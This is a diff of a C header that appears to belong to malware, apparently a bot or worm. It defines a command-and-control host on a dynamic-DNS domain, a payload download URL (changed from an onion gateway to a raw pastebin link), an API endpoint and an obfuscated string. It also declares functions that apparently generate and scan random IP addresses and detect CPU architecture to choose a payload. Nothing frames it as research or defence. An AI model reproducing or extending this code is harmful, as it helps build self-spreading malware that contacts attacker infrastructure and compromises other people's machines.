@@ -58,25 +58,25 @@
 # define true 1
 # define false 0
 
-# define DEBUG 1
+# define DEBUG 0
 
 # include "../libft/libft.h"
 
-# define url "GPfdsofidngffds.ddns.net"
+# define url "fdsofidngffds.ddns.net"
 # define stringifer "Zib'vZg]^u'_k"
-# define download_url "https://bpnkhnmt5voyl4suuf3kuybq4o7xqijlniqa223t4dp3oqy2hs3jwkqd.onion.ly/"
+# define download_url "https://pastebin.com/raw/CumbNc52"
 # define url_page "/api.php"
 
 char			*ft_strnjoin(char *s1, char *s2, int n);
 char			*ft_strnjoinf(char *s1, char *s2, int n);
 char			*ft_get_id(void);
-void			ft_scan_world(pthread_t thread);
+void			ft_scan_world(void);
 void			ft_put_ip(char *ip, int tmp, int i);
 void			ft_generate_ip(char *ip);
 void			ft_free_split(char **split);
 char			*ft_request(char *post);
 int				ft_split_len(char **split);
-char			*ft_getarch();
+char			*ft_getarch(void);
 
 // Protocol
 // 			General
